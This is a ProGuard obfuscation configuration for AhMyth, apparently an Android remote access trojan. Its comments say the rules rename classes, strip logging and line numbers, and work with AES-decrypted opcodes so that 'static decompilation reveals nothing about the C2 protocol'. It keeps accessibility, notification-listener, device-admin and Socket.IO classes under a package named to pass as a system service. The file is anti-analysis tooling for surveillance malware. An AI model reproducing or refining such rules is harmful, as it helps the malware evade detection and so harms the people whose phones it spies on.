# ============================================================
# AhMyth — Aggressive ProGuard Obfuscation Rules
# ============================================================
#
# These rules are designed to:
#   1. Rename ALL classes to short meaningless names (a.a.a)
#   2. Strip all Log.d/e/i/v/w calls from release builds
#   3. Shrink & optimize unused code and resources
#   4. Obfuscate string literals where possible
#   5. Preserve only what the Android framework and libraries
#      need to function
#
# The AES-decrypted opcodes in ObfuscationUtils are runtime-only
# and never appear in the compiled DEX as plaintext strings.
# Combined with these rules, static decompilation reveals nothing
# about the C2 protocol.
#
# ============================================================
# KEEP: Android framework entry points
# ============================================================

-keep class * extends android.app.Service { *; }
-keep class * extends android.app.Activity { *; }
-keep class * extends android.content.BroadcastReceiver { *; }
-keep class * extends android.accessibilityservice.AccessibilityService { *; }
-keep class * extends android.service.notification.NotificationListenerService { *; }
-keep class * extends android.app.admin.DeviceAdminReceiver { *; }
-keep class * extends androidx.work.Worker { *; }

# ============================================================
# KEEP: Firebase messaging
# ============================================================

-keep class * extends com.google.firebase.messaging.FirebaseMessagingService { *; }

# ============================================================
# KEEP: Socket.IO client (uses reflection)
# ============================================================

-keep class io.socket.** { *; }
-keep class org.json.** { *; }

# ============================================================
# KEEP: BuildConfig (needed for SOCKET_URL)
# ============================================================

-keep class com.android.background.services.BuildConfig { *; }

# ============================================================
# KEEP: Managers that are called via class name reflection
# ============================================================

# Keep all helper managers since they're instantiated explicitly
-keep class com.android.background.services.helpers.** { *; }

# ============================================================
# CRITICAL: Keep JNI native methods — ProGuard renames break JNI
# ============================================================

# Without this rule, -repackageclasses renames ObfuscationUtils to a root-package
# class (e.g., a.a.a), but the JNI C function is named
# Java_com_android_background_services_ObfuscationUtils_nativeDecrypt,
# which no longer matches at runtime. Result: UnsatisfiedLinkError.
-keep class com.android.background.services.ObfuscationUtils {
    native <methods>;
    *;
}

# ============================================================
# KEEP: R classes for resource shrinking
# ============================================================

-keep class com.android.background.services.R { *; }
-keep class **.R
-keep class **.R$* { *; }

# ============================================================
# OBFUSCATION: Aggressive renaming
# ============================================================

# CRITICAL: Keep the original package names for all Android entry points
# (Activities, Services, Receivers, etc.) referenced in AndroidManifest.xml.
# Without this rule, -repackageclasses below moves these classes to the
# root package and the framework can't find them at runtime, causing
# ClassNotFoundException on launch.
-keeppackagenames com.android.background.services

# Rename all remaining classes to a.a.a, a.a.b, etc.
# This makes decompiled code extremely hard to read
-repackageclasses ''
-allowaccessmodification
-useuniqueclassmembernames

# ============================================================
# STRIP: Logging (release builds only)
# ============================================================

# Completely remove all Log calls from release builds
-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
    public static int e(...);
    public static int wtf(...);
}

# ============================================================
# STRIP: Debugging metadata
# ============================================================

# Remove line numbers and source file names (hide stack trace origins)
-renamesourcefileattribute SourceFile
-keepattributes Exceptions, InnerClasses, Signature, *Annotation*, EnclosingMethod

# ============================================================
# OPTIMIZATION: Aggressive shrinking
# ============================================================

# Shrink resources: remove unused strings, layouts, etc.
# (Requires resource shrinking in build.gradle)
-optimizationpasses 5
-mergeinterfacesaggressively
-overloadaggressively

# ============================================================
# WARNINGS: Suppress expected warnings
# ============================================================

-dontwarn javax.annotation.**
-dontwarn com.google.firebase.**
-dontwarn io.socket.**

# ============================================================
# KEEP: JSON keys used by Gson/reflection (none currently)
# ============================================================

# If you add serialization later, keep the fields:
# -keepclassmembers class com.android.background.services.** {
#     *;
# }
